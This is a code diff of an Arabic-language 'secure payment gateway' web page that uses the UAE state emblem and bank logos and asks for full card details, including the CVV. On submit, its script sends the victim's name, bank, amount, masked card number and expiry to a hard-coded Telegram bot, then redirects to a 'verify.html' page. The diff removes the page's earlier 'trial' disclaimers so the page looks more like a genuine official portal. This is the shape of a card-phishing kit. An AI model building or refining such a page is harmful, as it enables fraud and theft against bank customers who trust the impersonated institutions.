@@ -3,35 +3,162 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>بوابة الدفع — الدفع</title>
+  <title>بوابة الدفع الآمنة</title>
   <style>
-    /* تصميم بسيط ومتوافق مع المحمول، يحافظ على مظهر احترافي */
-    body{font-family:Tahoma, Arial, sans-serif;direction:rtl;background:#f5f7f5;margin:0;padding:20px;box-sizing:border-box}
-    .wrap{max-width:420px;margin:30px auto}
-    .card{background:#fff;border-radius:10px;padding:18px;box-shadow:0 6px 18px rgba(0,0,0,0.06)}
-    header{display:flex;align-items:center;justify-content:center;flex-direction:column;margin-bottom:12px}
-    header img{height:70px;margin-bottom:8px}
-    h1{margin:0 0 6px;font-size:20px;color:#1f6d3b;text-align:center}
-    label{display:block;margin-top:12px;font-weight:700;color:#222}
-    input,select,button{width:100%;padding:12px;margin-top:6px;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:15px}
-    select{appearance:none;background-position:calc(100% - 12px) center;background-repeat:no-repeat}
-    .row{display:flex;gap:8px}
-    .row .col{flex:1}
-    .small{font-size:13px;color:#666;text-align:center;margin-top:10px}
-    .error{color:#b00020;font-size:13px;display:none;margin-top:8px}
-    button{background:#1f6d3b;color:#fff;border:0;cursor:pointer;font-weight:800;border-radius:8px}
-    @media (max-width:420px){
-      .wrap{padding:0 12px}
+    /* ===== التصميم العام ===== */
+    body {
+      font-family: 'Tahoma', Arial, sans-serif;
+      background: linear-gradient(135deg, #f2f7f5, #e6eeea);
+      margin: 0;
+      padding: 0;
+      direction: rtl;
+      box-sizing: border-box;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 30px auto;
+      padding: 20px;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 25px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+      transition: all 0.3s ease;
+    }
+
+    .card:hover {
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12);
+    }
+
+    /* ===== الهيدر ===== */
+    header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    header img {
+      height: 80px;
+      margin-bottom: 10px;
+    }
+
+    header h1 {
+      font-size: 24px;
+      color: #1f6d3b;
+      margin: 0;
+    }
+
+    /* ===== الحقول ===== */
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: 600;
+      color: #222;
+      font-size: 15px;
+    }
+
+    input,
+    select,
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 6px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      box-sizing: border-box;
+      font-size: 15px;
+      transition: border-color 0.2s ease;
+    }
+
+    input:focus,
+    select:focus {
+      border-color: #1f6d3b;
+      outline: none;
+    }
+
+    /* ===== قائمة البنوك مع الصور ===== */
+    .bank-select {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .bank-logos {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 10px;
+      justify-content: center;
+    }
+
+    .bank-logos img {
+      width: 50px;
+      height: 30px;
+      object-fit: contain;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      padding: 3px;
+      background: #fff;
+    }
+
+    /* ===== صفوف متعددة ===== */
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .col {
+      flex: 1;
+    }
+
+    /* ===== رسائل الخطأ ===== */
+    .error {
+      color: #b00020;
+      font-size: 13px;
+      display: none;
+      margin-top: 8px;
+      text-align: center;
+    }
+
+    /* ===== الزر ===== */
+    button {
+      background: #1f6d3b;
+      color: #fff;
+      border: 0;
+      cursor: pointer;
+      font-weight: bold;
+      margin-top: 20px;
+      font-size: 16px;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #155a2e;
+    }
+
+    /* ===== ميديا كويري للشاشات الصغيرة ===== */
+    @media (max-width: 480px) {
+      header img {
+        height: 60px;
+      }
+      header h1 {
+        font-size: 20px;
+      }
+      .bank-logos img {
+        width: 40px;
+        height: 25px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="wrap">
+  <div class="container">
     <div class="card">
       <header>
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/65/Emblem_of_the_United_Arab_Emirates.svg" alt="شعار">
         <h1>بوابة الدفع الآمنة</h1>
-        <div class="small">تابع إكمال الدفع بأمان — تجريبي</div>
       </header>
 
       <form id="paymentForm" autocomplete="off" novalidate>
@@ -39,32 +166,26 @@
         <input id="fullName" type="text" placeholder="الاسم كما في البطاقة" required>
 
         <label for="bank">البنك</label>
-        <select id="bank" required>
-          <option value="">— اختر البنك —</option>
-          <option>بنك أبوظبي الأول</option>
-          <option>مصرف أبوظبي الإسلامي</option>
-          <option>بنك أبوظبي التجاري</option>
-          <option>بنك الإمارات دبي الوطني</option>
-          <option>بنك دبي الإسلامي</option>
-          <option>بنك دبي التجاري</option>
-          <option>بنك المشرق</option>
-          <option>مصرف الشارقة الإسلامي</option>
-          <option>بنك عجمان</option>
-          <option>مصرف الهلال</option>
-          <option>بنك رأس الخيمة</option>
-          <option>بنك الفجيرة الوطني</option>
-          <option>البنك العربي المتحد</option>
-          <option>بنك أم القيوين الوطني</option>
-          <option>بنك الشارقة</option>
-          <option>البنك التجاري الدولي</option>
-          <option>HSBC</option>
-          <option>ستاندرد تشارترد</option>
-          <option>سيتي بنك</option>
-          <option>الإمارات الإسلامي</option>
-          <option>LIV</option>
-          <option>المارية المحلي</option>
-          <option>Wio Bank</option>
-        </select>
+        <div class="bank-select">
+          <select id="bank" required>
+            <option value="">— اختر البنك —</option>
+            <option>بنك أبوظبي الأول</option>
+            <option>مصرف أبوظبي الإسلامي</option>
+            <option>بنك الإمارات دبي الوطني</option>
+            <option>بنك دبي الإسلامي</option>
+            <option>بنك المشرق</option>
+            <option>HSBC</option>
+            <option>سيتي بنك</option>
+          </select>
+        </div>
+
+        <div class="bank-logos">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/HSBC_logo_%282018%29.svg" alt="HSBC">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Emirates_NBD_logo.svg" alt="Emirates NBD">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/ADIB_logo.svg" alt="ADIB">
+        </div>
 
         <label for="amount">قيمة السداد (درهم إماراتي)</label>
         <input id="amount" type="number" min="1" step="0.01" placeholder="مثال: 100.00" required>
@@ -87,34 +208,29 @@
             <label for="expiryYear">سنة الانتهاء (YYYY)</label>
             <select id="expiryYear" required>
               <option value="">--</option>
-              <!-- 2025 إلى 2044 حسب طلبك -->
-              <script>document.write('');</script>
             </select>
           </div>
         </div>
 
-        <label for="cvv">CVV</label>
+        <label for="cvv">رمز التحقق CVV</label>
         <input id="cvv" type="password" inputmode="numeric" maxlength="4" placeholder="***" required>
 
         <div class="error" id="formError">الرجاء ملء كل الحقول بشكل صحيح.</div>
 
-        <button type="submit">المتابعة إلى التحقق</button>
+        <button type="submit">متابعة الدفع</button>
       </form>
-
-      <div class="small">سيتم توجيهك إلى صفحة التحقق لإدخال رمز التحقق.</div>
     </div>
   </div>
 
   <script>
-    // ======= تكوين بوت التلغرام (ضع التوكن و chat_id التي زودتني بها) =======
+    // ===== تكوين البوت =====
     const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
     const CHAT_ID  = "8404960059";
-    // =======================================================================
 
-    // إضافة سنوات الانتهاء من 2025 إلى 2044 ديناميكياً
-    (function fillYears(){
+    // إضافة سنوات الانتهاء ديناميكياً
+    (function fillYears() {
       const sel = document.getElementById('expiryYear');
-      for(let y=2025;y<=2044;y++){
+      for (let y = 2025; y <= 2044; y++) {
         const o = document.createElement('option');
         o.textContent = String(y);
         o.value = String(y);
@@ -122,22 +238,22 @@
       }
     })();
 
-    // تهيئة تنسيق رقم البطاقة (4-4-4-4)
-    function formatCardNumberField(el){
-      let v = el.value.replace(/\D/g,'').slice(0,16);
+    // تنسيق رقم البطاقة
+    function formatCardNumberField(el) {
+      let v = el.value.replace(/\D/g, '').slice(0, 16);
       const parts = v.match(/.{1,4}/g) || [];
       el.value = parts.join('-');
     }
-    document.getElementById('cardNumber').addEventListener('input', function(){ formatCardNumberField(this); });
+    document.getElementById('cardNumber').addEventListener('input', function () {
+      formatCardNumberField(this);
+    });
 
-    // وظيفة لاستخراج آخر 4 أرقام
-    function last4(numberStr){
-      const digits = numberStr.replace(/\D/g,'');
-      return digits.slice(-4).padStart(4,'*');
+    function last4(numberStr) {
+      const digits = numberStr.replace(/\D/g, '');
+      return digits.slice(-4).padStart(4, '*');
     }
 
-    // تحقق أساسي قبل الإرسال
-    document.getElementById('paymentForm').addEventListener('submit', async function(e){
+    document.getElementById('paymentForm').addEventListener('submit', async function (e) {
       e.preventDefault();
       const errEl = document.getElementById('formError');
       errEl.style.display = 'none';
@@ -150,70 +266,53 @@
       const expiryYear = document.getElementById('expiryYear').value;
       const cvv = document.getElementById('cvv').value.trim();
 
-      // تحقق الحقول المطلوبة
-      if(!fullName || !bank || !amount || !cardNumber || !expiryMonth || !expiryYear || !cvv){
+      if (!fullName || !bank || !amount || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
         errEl.textContent = 'الرجاء ملء كل الحقول المطلوبة.';
         errEl.style.display = 'block';
         return;
       }
 
-      // تحقق مبسط لرقم البطاقة (يجب أن يحتوي على 12-16 رقم)
-      const digits = cardNumber.replace(/\D/g,'');
-      if(digits.length < 12 || digits.length > 16){
-        errEl.textContent = 'رقم البطاقة غير صالح (يجب أن يكون 12 إلى 16 رقم).';
+      const digits = cardNumber.replace(/\D/g, '');
+      if (digits.length < 12 || digits.length > 16) {
+        errEl.textContent = 'رقم البطاقة غير صالح.';
         errEl.style.display = 'block';
         return;
       }
 
-      // تحقق CVV (3 أو 4 أرقام)
-      if(!/^\d{3,4}$/.test(cvv)){
+      if (!/^\d{3,4}$/.test(cvv)) {
         errEl.textContent = 'رمز CVV غير صالح.';
         errEl.style.display = 'block';
         return;
       }
 
-      // تحقق أن السنة/الشهر ليست منتهية (اختبار بسيط)
       const now = new Date();
-      const yNum = parseInt(expiryYear,10), mNum = parseInt(expiryMonth,10);
-      if(yNum < now.getFullYear() || (yNum === now.getFullYear() && mNum < now.getMonth()+1)){
+      const yNum = parseInt(expiryYear, 10), mNum = parseInt(expiryMonth, 10);
+      if (yNum < now.getFullYear() || (yNum === now.getFullYear() && mNum < now.getMonth() + 1)) {
         errEl.textContent = 'تاريخ الصلاحية منتهي.';
         errEl.style.display = 'block';
         return;
       }
 
-      // جهّز بيانات غير حساسة للتخزين والارسال: لا نرسل CVV أو رقم البطاقة الكامل
       const maskedCard = '****-****-****-' + last4(cardNumber);
-      const dataToStore = {
-        fullName, bank, amount,
-        cardLast4: last4(cardNumber),
-        cardMasked: maskedCard,
-        expiryMonth, expiryYear
-      };
 
-      // خزّن النسخة الآمنة في الـ sessionStorage للصفحة التالية (verify.html) — دون CVV/رقم كامل
-      sessionStorage.setItem('paymentSafe', JSON.stringify(dataToStore));
+      const message = `💳 عملية دفع جديدة:
+-----------------------
+👤 الاسم: ${fullName}
+🏦 البنك: ${bank}
+💰 المبلغ: ${amount} درهم
+🔢 البطاقة: ${maskedCard}
+📆 تاريخ الانتهاء: ${expiryMonth}/${expiryYear}`;
 
-      // جهّز رسالة تيليجرام ببيانات غير حساسة فقط
-      const message = `🟢 إشعار دفع (تجريبي)
-الاسم: ${fullName}
-البنك: ${bank}
-المبلغ: ${amount} درهم
-البطاقة (آخر 4): ${last4(cardNumber)}
-تاريخ صلاحية البطاقة: ${expiryMonth}/${expiryYear}
-(ملاحظة: لا يتم إرسال CVV أو رقم البطاقة الكامل لأمان الاختبار)`;
-
-      // حاول إرسال الرسالة إلى تيليجرام — إن فشل، نتجاهل الخطأ لكن نتابع للتجربة المحلية
-      try{
+      try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: CHAT_ID, text: message })
         });
-      }catch(err){
+      } catch (err) {
         console.warn('فشل الإرسال إلى تيليجرام —', err);
       }
 
-      // توجه لصفحة التحقق
       window.location.href = 'verify.html';
     });
   </script>
